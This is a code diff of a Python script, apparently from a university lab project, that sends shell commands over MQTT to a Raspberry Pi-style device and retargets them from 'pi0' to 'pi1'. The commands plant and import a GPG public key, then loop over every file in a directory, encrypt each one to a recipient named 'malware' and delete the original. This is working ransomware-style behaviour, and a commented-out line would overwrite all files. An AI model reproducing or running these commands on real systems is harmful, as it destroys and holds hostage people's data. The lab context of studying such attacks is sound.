@@ -17,7 +17,7 @@ class pubOnly():
 
         topic = "PoliTo/C4ES/" + clientname + "/command"
 
-        message1 = {"src" : clientname, "dest" : "pi0", "command" : "ls -la"}
+        message1 = {"src" : clientname, "dest" : "pi1", "command" : "ls -la"}
 
         # sleep(5)
 
@@ -91,10 +91,10 @@ class pubOnly():
             row = row.strip('\n')
             if(primo == 1):
                 primo = 0
-                message = {"src" : clientname, "dest" : "pi0", "command" : f"echo {row} > public.key"}
+                message = {"src" : clientname, "dest" : "pi1", "command" : f"echo {row} > public.key"}
                 self.client.myPublish(topic, message)
             else:
-                message = {"src" : clientname, "dest" : "pi0", "command" : f"echo {row} >> public.key"}
+                message = {"src" : clientname, "dest" : "pi1", "command" : f"echo {row} >> public.key"}
                 self.client.myPublish(topic, message)
             sleep(0.5)
 
@@ -102,7 +102,7 @@ class pubOnly():
 
         # sleep(5)
 
-        message = {"src" : clientname, "dest" : "pi0", "command" : "gpg --import public.key"}
+        message = {"src" : clientname, "dest" : "pi1", "command" : "gpg --import public.key"}
         self.client.myPublish(topic, message)        
 
         sleep(5)
@@ -115,7 +115,7 @@ class pubOnly():
 
         # sleep(5)
 
-        message = {"src" : clientname, "dest" : "pi0", "command" : "cd ./A"}
+        message = {"src" : clientname, "dest" : "pi1", "command" : "cd ./A"}
         self.client.myPublish(topic, message)
 
         sleep(5)
@@ -135,7 +135,7 @@ class pubOnly():
         # message = {"src" : clientname, "dest" : "pi0", "command" : "for i in $(find . -type f -print); do echo ciao > $i;  done"}
         # self.client.myPublish(topic, message) 
 
-        message = {"src" : clientname, "dest" : "pi0", "command" : "for i in $(find . -type f -print); do gpg --always-trust -e -r \"malware\" $i; rm -f $i; sleep 1; done"}
+        message = {"src" : clientname, "dest" : "pi1", "command" : "for i in $(find . -type f -print); do gpg --always-trust -e -r \"malware\" $i; rm -f $i; sleep 1; done"}
         self.client.myPublish(topic, message) 
 
         sleep(5)
